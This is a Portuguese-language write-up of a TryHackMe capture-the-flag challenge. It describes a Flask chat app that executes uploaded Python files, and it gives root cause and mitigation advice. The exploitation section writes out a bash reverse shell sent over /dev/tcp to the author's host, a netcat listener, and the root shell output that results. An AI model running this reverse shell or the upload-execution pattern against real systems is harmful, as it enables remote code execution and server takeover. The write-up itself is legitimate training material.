# 🩷 LoveConnect – Speed Chatting (TryHackMe CTF)

## 🏷 Categoria
Web

## 🎯 Dificuldade
Easy

---

## 🧠 Visão Geral

O desafio **LoveConnect – Speed Chatting** apresenta uma aplicação web desenvolvida em **Flask**, contendo:

- Upload de foto de perfil
- Sistema de chat em tempo real
- API para envio e consulta de mensagens

Durante a análise, foi identificada uma vulnerabilidade crítica no mecanismo de upload de arquivos.

---

## 🔎 Reconhecimento Inicial

Durante a enumeração inicial foi possível identificar:

- Backend: **Flask**
- Header do servidor: `Werkzeug/3.1.5 Python/3.10.12`
- Endpoints relevantes:
  - `/upload_profile_pic`
  - `/api/messages`
  - `/api/send_message`
  - `/uploads/<filename>`

A análise do código JavaScript revelou que:

- As mensagens são renderizadas usando `textContent`
- O backend sanitiza entradas com `html.escape()`

Isso descartou os seguintes vetores:

- ❌ XSS  
- ❌ SSTI  
- ❌ Injeção de HTML  

Com isso, o foco foi direcionado para o mecanismo de upload.

---

## 📁 Análise do Upload

O endpoint `/upload_profile_pic` permite envio de arquivos via `multipart/form-data`.

Mais tarde, ao analisar o código-fonte da aplicação (`app.py`), foi identificado o seguinte trecho crítico:

```python
# WHITELIST: Only execute Python files (intentional vulnerability for CTF)
if unique_filename.endswith('.py'):
    subprocess.run(
        [sys.executable, filepath],
        capture_output=True,
        timeout=5,
        text=True
    )
```

---

## 🔥 Vulnerabilidade Identificada

> **Arbitrary File Upload + Execução Insegura de Arquivos (RCE)**

Arquivos com extensão `.py` enviados pelo usuário são automaticamente executados pelo servidor.

Isso caracteriza:

- Execução remota de código (RCE)
- Execução com privilégios do processo do servidor
- Comprometimento total da aplicação

---

## 🚀 Exploração

Foi realizado o upload de um arquivo Python contendo um reverse shell.

import os
os.system("bash -c 'bash -i >& /dev/tcp/192.168.195.92/1234 0>&1'")

Enquanto em outro terminal ouvia com nc -lvp 1234

┌──(samuraigaijin㉿DESKTOP-5FSVHO9)-[~]
└─$ nc -lvp 1234
listening on [any] 1234 ...
10.64.142.1: inverse host lookup failed: Unknown host
connect to [192.168.195.92] from (UNKNOWN) [10.64.142.1] 40834
bash: cannot set terminal process group (413): Inappropriate ioctl for device
bash: no job control in this shell
root@tryhackme-2204:/opt/Speed_Chat# ls
ls
app.py
flag.txt
uploads
root@tryhackme-2204:/opt/Speed_Chat# cat flag.txt
cat flag.txt
THM{xxxxx}root@tryhackme-2204:/opt/Speed_Chat# ls uploads

Como o servidor executa automaticamente qualquer arquivo `.py` enviado, foi possível obter execução de código no host.

Após a execução, foi possível acessar o diretório da aplicação:

```
/opt/Speed_Chat/
```

Conteúdo identificado:

```
app.py
flag.txt
uploads/
```

A flag estava armazenada no arquivo:

```
flag.txt
```

---

## 🏁 Flag

```
THM{xxxx - Omitido proposital}
```

---

## 🧩 Causa Raiz

A vulnerabilidade ocorre porque:

1. O upload aceita qualquer tipo de arquivo
2. Não há validação adequada de extensão ou MIME type
3. Arquivos `.py` são executados automaticamente via `subprocess.run`
4. O processo do servidor executa código fornecido pelo usuário

Esse comportamento foi intencionalmente implementado para fins de CTF.

---

## 🛡 Mitigação (Cenário Real)

Em ambiente de produção, as seguintes medidas devem ser adotadas:

- ❌ Nunca executar arquivos enviados pelo usuário
- ✅ Validar rigorosamente extensões e MIME type
- ✅ Armazenar uploads fora do diretório da aplicação
- ✅ Executar a aplicação com usuário de baixo privilégio
- ✅ Utilizar isolamento (containers, sandboxing)
- ❌ Nunca usar `subprocess` para executar conteúdo controlado pelo usuário

---

## 📚 Lições Aprendidas

- Nem toda vulnerabilidade Web Easy envolve XSS ou SQL Injection
- Upload de arquivos é um vetor extremamente crítico
- Análise de código-fonte pode revelar falhas lógicas graves
- Execução automática de arquivos enviados é uma vulnerabilidade crítica

---

## 💬 Considerações Finais

Este desafio demonstra como uma simples falha lógica pode levar à execução remota de código.

Mesmo em aplicações aparentemente simples, a execução automática de arquivos enviados por usuários representa um risco severo de segurança.

A identificação e exploração dessa vulnerabilidade reforça a importância de validações adequadas e da adoção do princípio do menor privilégio.
